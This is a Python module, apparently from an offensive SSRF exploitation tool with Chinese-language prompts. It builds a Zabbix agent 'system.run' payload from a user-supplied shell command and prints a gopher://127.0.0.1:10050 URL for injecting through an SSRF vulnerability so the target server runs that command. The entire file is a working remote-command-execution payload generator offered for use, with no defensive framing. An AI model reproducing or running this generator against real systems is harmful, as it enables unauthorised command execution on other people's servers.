import urllib
import urllib.parse
from .colors import c, DIM, BOLD, CYAN, YELLOW, GREEN, RED, UNDERLINE, BRIGHT_CYAN, BRIGHT_GREEN, BRIGHT_YELLOW, print_banner, print_step, print_info, print_success, print_warning


def Zabbix():
    print_banner("Zabbix Agent SSRF 利用")

    print_step(1, "配置命令")
    print_info("输入要在目标服务器上执行的系统命令")
    print_warning("注意: 需要目标 Zabbix 配置 EnableRemoteCommands=1")
    print_warning("示例命令: whoami, id, uname -a, ls -la /")
    command = input(c("  > Shell 命令 (默认 whoami): ", CYAN))
    if not command:
        command = "whoami"
        print_info(f"使用默认命令: {command}")

    payload = f"system.run[({command});sleep 2s]"
    finalpayload = (
        urllib.parse.quote_plus(payload)
        .replace("+", "%20")
        .replace("%2F", "/")
        .replace("%25", "%")
        .replace("%3A", ":")
    )

    print_banner("利用链接已生成")
    print("")
    print(c("  将以下 URL 编码到 SSRF 漏洞中:", CYAN))
    print("")
    print(c("  " + "-" * 48, DIM))
    print(c(f"gopher://127.0.0.1:10050/_{finalpayload}", UNDERLINE + YELLOW))
    print(c("  " + "-" * 48, DIM))
    print("")
    print_success(f"将在目标服务器上执行: {command}")

    print("\n" + c("  " + "=" * 48, BRIGHT_CYAN))
    print(c("  原作者: $_SpyD3r_$", BRIGHT_CYAN))
    print(c("  修改者: @_mingy_@", BRIGHT_CYAN))
    print(c("  " + "=" * 48, BRIGHT_CYAN))
